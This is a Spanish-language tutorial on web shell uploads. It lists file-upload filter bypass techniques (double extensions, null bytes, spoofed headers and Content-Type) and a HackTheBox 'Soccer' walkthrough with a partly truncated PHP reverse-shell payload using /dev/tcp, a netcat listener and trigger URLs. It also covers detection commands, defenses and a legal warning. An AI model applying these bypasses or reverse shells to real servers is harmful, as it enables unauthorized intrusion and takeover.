Upload de Web Shells

Técnicas de subida de archivos maliciosos y ejecución remota de código

¿Qué es una Web Shell?

Definición: Una Web Shell es un script o programa malicioso diseñado para ser ejecutado en un servidor web comprometido. Proporciona a los atacantes una interfaz basada en web para controlar remotamente el servidor, ejecutar comandos del sistema, manipular archivos y mantener persistencia en el sistema objetivo.

Las Web Shells son una de las herramientas más utilizadas en ataques de post-explotación, ya que permiten:

  • Ejecución remota de comandos: Control total del sistema operativo
  • Gestión de archivos: Lectura, escritura y modificación de archivos
  • Persistencia: Mantener acceso continuo al sistema comprometido
  • Escalación de privilegios: Búsqueda de vulnerabilidades locales
  • Lateral movement: Acceso a otros sistemas en la red

Impacto de Seguridad: Una Web Shell exitosamente implementada puede resultar en compromiso total del servidor, robo de datos, instalación de malware adicional y uso del servidor como punto de lanzamiento para otros ataques.

Técnicas de Bypass de Filtros

Los desarrolladores implementan diversos filtros de seguridad para prevenir la subida de archivos maliciosos. Aquí se presentan técnicas comunes de evasión:

Extension Spoofing
Utilizar extensiones dobles o alternativas para evadir filtros básicos
shell.php.jpg shell.php.gif shell.phtml shell.php5 shell.phps
Case Sensitivity
Aprovechar sensibilidad a mayúsculas/minúsculas en validaciones
shell.PHP shell.Php shell.pHp shell.PhP
Null Byte Injection
Usar caracteres null para truncar validación de extensiones
shell.php%00.jpg shell.php\x00.png shell.php%00.gif
Archive Upload
Subir shells dentro de archivos comprimidos
shell.zip (contiene shell.php) shell.rar (extrae automáticamente) shell.tar.gz
Image Header Spoofing
Añadir headers de imagen válidos antes del código malicioso
GIF89a; JFIF + PHP code PNG header + shell
Content-Type Manipulation
Modificar el Content-Type HTTP durante la subida
Content-Type: image/jpeg (para archivo .php) Content-Type: image/png Content-Type: text/plain

Caso Práctico: HTB Soccer

Explotación de File Upload en Aplicación Web
Información del objetivo:
  • Máquina: HTB Soccer (10.10.11.194)
  • Tecnología: PHP con upload habilitado
  • Vulnerabilidad: File upload sin validación adecuada
  • Objetivo: Reverse shell y acceso al sistema

Metodología de Explotación:

1
Reconocimiento
Identificación de funcionalidad de upload de archivos PHP
2
Creación de Payload
Desarrollo de reverse shell en PHP con IP y puerto específicos
3
Configuración de Listener
Netcat en escucha en la máquina atacante
4
Ejecución y Acceso
Trigger del payload y establecimiento de reverse shell

Creación del Payload Malicioso:

malicious.php
& /dev/tcp/$ip/$port 0>&1"; // Ejecución del comando shell_exec($cmd); ?>

Configuración del Listener:

Atacante (10.10.14.14)
# Poner netcat en escucha en el puerto 443 nc -nlvp 443 # Alternativa con rlwrap para mejor manejo rlwrap nc -nlvp 443

Proceso de Upload:

  1. Subir el archivo malicious.php a través del formulario web
  2. Verificar la ruta donde se almacena el archivo
  3. Mantener el listener de netcat activo
  4. Ejecutar el archivo via navegador o curl

Trigger del Payload:

http://soccer.htb/tiny/uploads/malicious.php
Alternativa con curl
curl http://soccer.htb/tiny/uploads/malicious.php

Resultado Esperado: Al acceder a la URL del archivo subido, el servidor ejecuta el código PHP que establece una conexión TCP reversa hacia nuestra máquina atacante, proporcionando una shell interactiva.

Detección y Análisis

Indicadores de Compromiso (IoCs)

Señales de presencia de Web Shells:

  • Archivos sospechosos: Scripts con nombres genéricos o fechas anómalas
  • Conexiones de red: Tráfico saliente inusual hacia IPs externas
  • Procesos del sistema: Comandos ejecutados por el usuario del servidor web
  • Logs de acceso: Peticiones GET/POST hacia archivos PHP en directorios de upload
  • Archivos de gran tamaño: Uploads excesivamente grandes o con patrones inusuales

Técnicas de Detección

Búsqueda de Web Shells
# Buscar archivos PHP en directorios de upload find /var/www/html/uploads -name "*.php" -type f # Buscar patrones comunes de web shells grep -r "shell_exec\|system\|exec\|passthru" /var/www/html/ # Verificar archivos modificados recientemente find /var/www/html -name "*.php" -mtime -7 -ls # Buscar archivos con permisos 777 find /var/www/html -perm 777 -type f

Medidas de Protección

Implementación de Defensas:

  • Validación estricta: Lista blanca de extensiones y tipos MIME
  • Análisis de contenido: Escaneado de firmas maliciosas
  • Sandboxing: Ejecución en entornos aislados
  • Renombrado de archivos: Cambiar nombres y extensiones
  • Separación de directorios: Upload fuera del document root
  • Permisos restrictivos: Deshabilitar ejecución de scripts

Consideraciones Éticas y Legales

Advertencia Legal: Las técnicas de upload de Web Shells solo deben utilizarse en:

  • Aplicaciones web propias o con autorización explícita por escrito
  • Entornos de pentesting con contrato legal válido
  • Plataformas de práctica autorizadas (HTB, TryHackMe, VulnHub)
  • Laboratorios controlados de ciberseguridad y educación

La instalación no autorizada de Web Shells constituye un delito grave de acceso no autorizado a sistemas informáticos, punible según las legislaciones locales e internacionales. Los profesionales de ciberseguridad deben usar estos conocimientos exclusivamente para propósitos defensivos y educativos.
